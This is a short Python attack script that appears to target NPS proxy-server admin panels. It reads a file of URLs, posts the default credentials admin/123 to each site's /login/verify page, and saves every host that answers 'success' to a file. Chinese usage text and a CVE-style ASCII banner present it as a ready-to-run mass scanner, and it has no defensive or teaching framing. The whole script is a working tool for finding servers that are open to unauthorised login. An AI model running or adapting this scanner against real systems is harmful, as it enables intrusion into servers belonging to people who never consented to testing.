#coding=utf-8
import requests
def start():
    a='''
                             _______________   ________ ________           ____________ ________    ______  
  _______  __ ____           \_____  \   _  \  \_____  \\_____  \         /_   \_____  \\_____  \  /  __  \ 
_/ ___\  \/ // __ \   ______  /  ____/  /_\  \  /  ____/ /  ____/   ______ |   | _(__  <  _(__  <  >      < 
\  \___\   /\  ___/  /_____/ /       \  \_/   \/       \/       \  /_____/ |   |/       \/       \/   --   \
 \___  >\_/  \___  >         \_______ \_____  /\_______ \_______ \         |___/______  /______  /\______  /
     \/          \/                  \/     \/         \/       \/                    \/       \/        \/ 
                                                                                            by axing
    使用方法：python nps.py ,接着输入要存放url的文档即可
    '''
    print(a)

def result(txt):
    header={

        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9'
    }
    dat= {'username': 'admin', 'password': '123'}
    with open(txt,'r') as n:
            for url in n.readlines():
                url=url.strip()
                urls=url+'/login/verify'
                try:
                    req=requests.post(url=urls,headers=header,data=dat,timeout=2)
                except requests.exceptions.RequestException:
                            print(f'[-]{url} 检测超时')
                            continue
                except:
                    print(f'[-]{url} 检测异常')
                    continue 
                content='success'
                if content in req.text :
                    print(f'[+]{url}存在默认nps密码')
                    with open('c.txt','a+')as w:
                        w.writelines(url + '\n')
                        

                else:
                    print(f'[-]{url}xx')
    exit()


if __name__=='__main__':
    start()
    txt=input('请输入url文档:')
    result(txt)






    


